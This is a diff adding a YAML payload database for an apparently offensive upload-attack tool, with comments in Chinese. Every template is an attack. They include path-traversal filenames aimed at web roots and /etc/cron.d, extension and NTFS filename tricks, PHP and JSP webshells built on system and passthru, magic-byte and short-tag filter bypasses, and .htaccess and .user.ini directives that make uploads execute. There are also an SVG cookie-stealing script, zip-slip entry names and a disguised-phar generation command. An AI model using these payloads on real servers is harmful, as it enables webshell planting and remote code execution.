@@ -1,0 +1,431 @@
+ruleDB: v0.1.0
+# 文件上传模板。
+#
+# 这一类是**第一个需要 multipart 提交方式**的——原来的 place.* 只能出
+# urlencoded 表单，出不了 multipart（见方案 §6.3 与 output._multipart_body）。
+# 载荷落点由 `--part filename|content` 决定。
+
+templates:
+  # ---- 载荷落在文件名 ----
+
+  - id: upload.generic.filename.traversal
+    name: 文件名路径穿越
+    desc: 文件名里带穿越，把文件写进 Web 目录
+    vuln: [upload]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["/../", "/../../", "/../../../", "/../../../../", "/../../../../../"], default: "/../../../../"}
+      # Web 根目录因环境而异：Debian 是 /var/www/html，CentOS 是 /usr/share/nginx/html，
+      # 有些镜像是 /app。写死一个等于把模板钉死在一种环境上。
+      webroot:
+        options:
+          - {id: debian,  name: "Debian/Ubuntu · /var/www/html",   path: "var/www/html"}
+          - {id: centos,  name: "CentOS · /usr/share/nginx/html",  path: "usr/share/nginx/html"}
+          - {id: alpine,  name: "Alpine · /var/www/localhost/htdocs", path: "var/www/localhost/htdocs"}
+          - {id: tomcat,  name: "Tomcat · /usr/local/tomcat/webapps/ROOT", path: "usr/local/tomcat/webapps/ROOT"}
+        default: debian
+      ext:   {options: [".php", ".jsp", ".asp", ".aspx", ".phtml"], default: ".php"}
+    body: "<<depth>><<webroot.path>>/<<name>><<ext>>"
+    vars: [name]
+    requires: [writable, weak-upload-check]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: upload.generic.filename.double_ext
+    name: 双扩展名
+    desc: 白名单只看最后一个点后面的内容时，把可执行后缀放在前面
+    vuln: [upload]
+    content_type: [file-path]
+    component: [php, apache]
+    version: "*"
+    slots:
+      first:  {options: [".php", ".jsp", ".asp"], default: ".php"}
+      second: {options: [".jpg", ".png", ".gif", ".txt"], default: ".jpg"}
+    body: "<<name>><<first>><<second>>"
+    vars: [name]
+    requires: [weak-upload-check]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: upload.generic.filename.htaccess
+    name: 上传 .htaccess
+    desc: 先传 .htaccess 把 .jpg 映射成 PHP，再传图片马
+    vuln: [upload]
+    content_type: [file-path]
+    component: [apache]
+    version: "*"
+    body: ".htaccess"
+    vars: []
+    requires: [recon, writable]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: upload.generic.filename.windows
+    name: Windows 文件名穿越
+    desc: '目标是 Windows（IIS / ASP.NET）时用：路径写死指向 inetpub\wwwroot，后缀默认 .aspx。Linux 目标用 filename.traversal 那条，别拿这条去试'
+    vuln: [upload]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      ext: {options: [".aspx", ".asp", ".jsp", ".php"], default: ".aspx"}
+    body: "..\\..\\..\\..\\inetpub\\wwwroot\\<<name>><<ext>>"
+    vars: [name]
+    requires: [os-windows, writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 载荷落在文件内容 ----
+
+  - id: upload.generic.content.php
+    name: PHP 一句话
+    desc: 系统命令函数可换——目标禁了 system 时试 passthru
+    vuln: [upload]
+    content_type: [raw]
+    component: [php]
+    version: "*"
+    slots:
+      # **只收会把命令输出直接打出来的函数。**
+      # shell_exec / exec 不打印（它们返回字符串），写成 `<?php shell_exec('id'); ?>`
+      # 是一个语法合法、但什么都不输出的 webshell——正是要避免的静默损坏。
+      func: {options: ["system", "passthru"], default: "system"}
+    body: "<?php <<func>>('<<cmd>>'); ?>"
+    vars: [cmd]
+    requires: [weak-upload-check]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: upload.generic.content.magic
+    name: 魔术字节 + PHP
+    desc: 内容校验只看文件头时，前面垫上识别头骗过检测
+    vuln: [upload]
+    content_type: [raw]
+    component: [php]
+    version: "*"
+    slots:
+      # 只收**纯文本可表达**的魔术字节。PNG(\x89PNG) 和 ZIP(PK\x03\x04) 的头
+      # 含非 ASCII 字节，本工具的载荷是文本串，表达不了——这是已知边界，见方案 §3。
+      magic:
+        options:
+          - {id: gif,   name: "GIF89a",     head: "GIF89a"}
+          - {id: gif87, name: "GIF87a",     head: "GIF87a"}
+          - {id: bmp,   name: "BMP",        head: "BM"}
+          - {id: pdf,   name: "PDF",        head: "%PDF-1.4"}
+          - {id: riff,  name: "WEBP/RIFF",  head: "RIFF....WEBP"}
+        default: gif
+    body: "<<magic.head>><?php system('<<cmd>>'); ?>"
+    vars: [cmd]
+    requires: [weak-upload-check]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: upload.generic.content.jsp
+    name: JSP 一句话
+    desc: 目标是 Tomcat / JSP 时用，载荷落在 --part content。exec 不会把命令输出读回来——这条能证明代码执行，但页面上看不到回显
+    vuln: [upload]
+    content_type: [raw]
+    component: [jsp, tomcat]
+    version: "*"
+    body: "<% Runtime.getRuntime().exec(\"<<cmd>>\"); %>"
+    vars: [cmd]
+    requires: [weak-upload-check]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: upload.generic.content.svg
+    name: SVG 携带脚本
+    desc: 上传目录允许访问时，SVG 里的脚本会在浏览器里执行；也可带 XXE 实体
+    vuln: [upload]
+    content_type: [xml]
+    component: []
+    version: "*"
+    slots:
+      # 和 xss 那批用同样的 js 槽位，免得同一件事在两个类型里有两套说法
+      js: {options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"],
+           default: "alert(1)"}
+    body: |-
+      <?xml version="1.0" standalone="no"?>
+      <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+        <script type="text/javascript"><<js>></script>
+      </svg>
+    vars: []
+    requires: [upload-accessible]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: upload.generic.filename.htaccess.content
+    name: .htaccess 内容
+    desc: 配套 upload.generic.filename.htaccess 用。先传这个把指定后缀交给 PHP 解析，再传图片马。只在 Apache + AllowOverride 打开时生效
+    vuln: [upload]
+    content_type: [raw]
+    component: [apache, php]
+    version: "*"
+    slots:
+      ext: {options: [".jpg", ".png", ".gif", ".txt"], default: ".jpg"}
+    body: |-
+      AddType application/x-httpd-php <<ext>>
+    vars: []
+    requires: [writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: upload.generic.filename.userini.content
+    name: .user.ini 内容
+    desc: PHP-FPM / CGI 环境下不用 .htaccess 也能改配置：auto_prepend_file 指向的文件会在同目录每个 PHP 脚本前执行。只在 PHP 5.3+ 的 CGI/FPM 模式生效
+    vuln: [upload]
+    content_type: [raw]
+    component: [php]
+    version: ">=5.3"
+    body: |-
+      auto_prepend_file=<<file>>
+    vars: [file]
+    requires: [writable, weak-upload-check]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: upload.generic.filename.rare_ext
+    name: 少见可执行后缀
+    desc: 黑名单只列了 .php / .jsp / .asp 时，这些后缀往往漏网。能不能解析取决于服务器配置
+    vuln: [upload]
+    content_type: [file-path]
+    component: [php, apache]
+    version: "*"
+    slots:
+      ext: {options: [".phtml", ".pht", ".phar", ".php3", ".php4", ".php5", ".php7",
+                       ".inc", ".module", ".shtml"],
+            default: ".phtml"}
+    body: "<<name>><<ext>>"
+    vars: [name]
+    requires: [weak-upload-check]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: upload.generic.filename.trailing
+    name: 后缀尾部技巧
+    desc: 校验与落盘对文件名的理解不一致时用。Windows 会自动去掉结尾的空格和点；::$DATA 是 NTFS 数据流语法，读到的是 .php 的内容
+    vuln: [upload]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    slots:
+      trick:
+        options:
+          - {id: space, name: "后缀后接一个空格", tail: ".php "}
+          - {id: dot,   name: "后缀后接一个点（Windows 会去掉）", tail: ".php."}
+          - {id: ads,   name: "NTFS 数据流 ::$DATA", tail: ".php::$DATA"}
+          - {id: pct20, name: "后缀后接 %20", tail: ".php%20"}
+        default: space
+    body: "<<name>><<trick.tail>>"
+    vars: [name]
+    requires: [weak-upload-check, os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- .htaccess 的更多指令 ----
+  # AddType 那条只改「哪个后缀交给 PHP」；下面这几条能直接改配置项、
+  # 或者把整个目录都变成 PHP 处理器。都是 Apache + AllowOverride 下才生效。
+
+  - id: upload.generic.htaccess.directives
+    name: .htaccess 指令（改配置 / 换处理器）
+    desc: >-
+      auto_prepend_file 让同目录每个 PHP 脚本执行前先跑你那个文件（不用改后缀就能落地
+      代码，最省事）；SetHandler 把整个目录的所有文件都交给 PHP 处理器，
+      传图片马就会执行；php_flag engine on 是目标把引擎关了时再打开。
+      只在 Apache + AllowOverride All + mod_php 下生效；PHP-FPM/CGI 换
+      upload.generic.filename.userini.content。
+    vuln: [upload]
+    content_type: [raw]
+    component: [apache, php]
+    version: "*"
+    slots:
+      code:
+        options:
+          - {id: prepend, name: "auto_prepend_file 前置执行", text: "php_value auto_prepend_file <<file>>"}
+          - {id: append,  name: "auto_append_file 后置执行",  text: "php_value auto_append_file <<file>>"}
+          - {id: handler, name: "SetHandler 整目录当 PHP",    text: "SetHandler application/x-httpd-php"}
+          - {id: addhandler, name: "AddHandler 指定后缀",      text: "AddHandler application/x-httpd-php <<ext>>"}
+          - {id: engine,  name: "php_flag engine on",        text: "php_flag engine on"}
+          - {id: include, name: "auto_prepend_file 走 php://filter 读源码", text: "php_value auto_prepend_file php://filter/convert.base64-encode/resource=<<file>>"}
+        default: prepend
+    body: "<<code.text>>"
+    vars: [file, ext]
+    requires: [writable, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- .user.ini 与 session.upload_progress ----
+  # PHP-FPM / CGI 下 .htaccess 完全不起作用，能改的只有 .user.ini，
+  # 而且只有 PHP_INI_PERDIR / PHP_INI_ALL 这两个模式的配置项改得动。
+
+  - id: upload.generic.userini.upload_progress
+    name: .user.ini 打开上传进度写会话
+    desc: >-
+      session.upload_progress 是 PHP_INI_PERDIR，所以 .user.ini 改得动它：
+      cleanup=Off 让承载上传进度的会话文件在请求结束后不被删掉，
+      再发一个带 PHP_SESSION_UPLOAD_PROGRESS 字段、文件名里塞 PHP 代码的
+      multipart 请求（并用 Cookie 固定 PHPSESSID），代码就留在会话文件里了。
+      这一步只是把文件落到可预测路径，真正执行还要再用一次文件包含（见 lfi 那批）。
+      只在 PHP 5.3+ 的 CGI/FPM 模式、且 session 目录可读时成立。
+    vuln: [upload]
+    content_type: [raw]
+    component: [php]
+    version: ">=5.3"
+    body: |-
+      session.upload_progress.enabled=On
+      session.upload_progress.cleanup=Off
+      session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS
+    vars: []
+    requires: [writable, weak-upload-check, log-writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 内容绕过：不用 <?php 的几种写法 ----
+  # 校验器查 <?php 这个字符串时，下面三种都绕得过去，而且都是真能执行的 PHP。
+
+  - id: upload.generic.content.short_tag
+    name: 短标签 / 反引号 / script 标签
+    desc: >-
+      内容校验只拦 <?php 时用：<?= 是 echo 的短标签（要求 short_open_tag=On，
+      默认在多数发行版上是关的，但虚拟主机常开着）；反引号直接调 shell，
+      连 system 都不用写；<script language="php"> 只在 PHP 7 以前存在，
+      目标 PHP 5.x 时反而最不容易被拦。三种都要求文件最终被 PHP 解析
+      （见 filename.* 那批拿后缀）。
+    vuln: [upload]
+    content_type: [raw]
+    component: [php]
+    version: "*"
+    slots:
+      style:
+        options:
+          - {id: echo_short, name: "<?= 短标签",              code: "<?= system('<<cmd>>'); ?>"}
+          - {id: backtick,   name: "<?= 加反引号（不写函数名）", code: "<?= `<<cmd>>` ?>"}
+          - {id: script_tag, name: "<script language=php>（PHP 5.x）", code: "<script language=\"php\">system('<<cmd>>');</script>"}
+        default: echo_short
+    body: "<<style.code>>"
+    vars: [cmd]
+    requires: [weak-upload-check]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 校验与落盘理解不一致 ----
+  # 这一类靠的不是后缀本身，而是「校验器看到的文件名」和「服务器最终用的文件名」
+  # 不是同一个字符串。
+
+  - id: upload.generic.filename.server_parse
+    name: 解析差异（分号 / 数据流 / 空字节）
+    desc: >-
+      trick 那条是针对 Windows 文件名处理器的；这三条打的是**服务端软件自己的
+      文件名解析**：IIS 把 ; 之后当参数丢掉（shell.php;.jpg 存成 shell.php）、
+      NTFS 的 ::$DATA 数据流让 .jpg 读到的是 .php 的内容（要求 PHP < 8.1）、
+      %00 让 C 实现的长度截断掉后面的后缀（PHP < 5.3.4，或 Java/JSP 容器）。
+      先拿一个无害文件确认目标属于哪种，再挑对应那条。
+    vuln: [upload]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      trick:
+        options:
+          - {id: semicolon, name: "分号后截断（IIS）",       tail: ".php;.jpg"}
+          - {id: ads,       name: "NTFS 数据流 ::$DATA（PHP<8.1）", tail: ".php::$DATA"}
+          # id 必须加引号：YAML 里不引号的 null 是**空值**，不是字符串 "null"，
+          # 那样这个选项的 id 会变成 None，选它时直接报「不在 options 里」
+          - {id: "null",    name: "空字节截断（PHP<5.3.4）", tail: ".php%00.jpg"}
+          - {id: slash,     name: "斜杠当参数（部分 Java 容器）", tail: ".jsp/"}
+        default: semicolon
+    body: "<<name>><<trick.tail>>"
+    vars: [name]
+    requires: [weak-upload-check]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- ZIP 相关 ----
+
+  - id: upload.generic.zip.slip
+    name: ZIP 条目名穿越（zip slip）
+    desc: >-
+      上传的压缩包在服务端被解压时，**条目名**里的穿越序列会写到目标目录外面，
+      换掉 Web 目录下的一个可执行文件即可。这里给的是条目名——ZIP 本身是二进制
+      （PK\x03\x04），本工具表达不了，要用 zip / python 自己打包，
+      条目名按这条填（`zip` 会把路径里的 .. 原样保留）。解压实现做了规范化
+      或加了前缀时无效。
+    vuln: [upload]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["/../", "/../../", "/../../../", "/../../../../", "/../../../../../"], default: "/../../../../"}
+      webroot:
+        options:
+          - {id: debian,  name: "Debian/Ubuntu · /var/www/html",   path: "var/www/html"}
+          - {id: centos,  name: "CentOS · /usr/share/nginx/html",  path: "usr/share/nginx/html"}
+          - {id: alpine,  name: "Alpine · /var/www/localhost/htdocs", path: "var/www/localhost/htdocs"}
+          - {id: tomcat,  name: "Tomcat · /usr/local/tomcat/webapps/ROOT", path: "usr/local/tomcat/webapps/ROOT"}
+          - {id: cron,    name: "计划任务 · /etc/cron.d",          path: "etc/cron.d"}
+        default: debian
+      ext:   {options: [".php", ".jsp", ".sh", ".py"], default: ".php"}
+    body: "<<depth>><<webroot.path>>/<<name>><<ext>>"
+    vars: [name]
+    requires: [writable, weak-upload-check]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: upload.generic.phar.disguise
+    name: phar 伪装的图片马（生成脚本）
+    desc: >-
+      要在**目标本机**生成一个「扩展名和头都是图片、内容是 phar」的文件时用：
+      phar 的 stub 以 GIF89a 开头，于是 getimagesize 之类的图片校验能过，
+      而 phar:// 反序列化时读的是里面的元数据。这条给的是**生成命令**——
+      在目标上执行它（比如通过已有的命令注入）之后，再用 lfi 的 phar:// 去打，
+      或者直接请求这个文件触发。要求 phar.readonly=Off（默认是 On，
+      必须在 php.ini 或命令行 -d 关掉）——这条先确认再动手。
+    vuln: [upload]
+    content_type: [shell-command]
+    component: [php]
+    version: "<8.0"
+    slots:
+      file: {options: ["shell.jpg", "shell.gif", "shell.png"], default: "shell.jpg"}
+    body: |-
+      php -d phar.readonly=0 -r '$p=new Phar("<<file>>");$p->startBuffering();$p->addFromString("a.txt","<<payload>>");$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");$p->stopBuffering();'
+    vars: []
+    requires: [generator, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
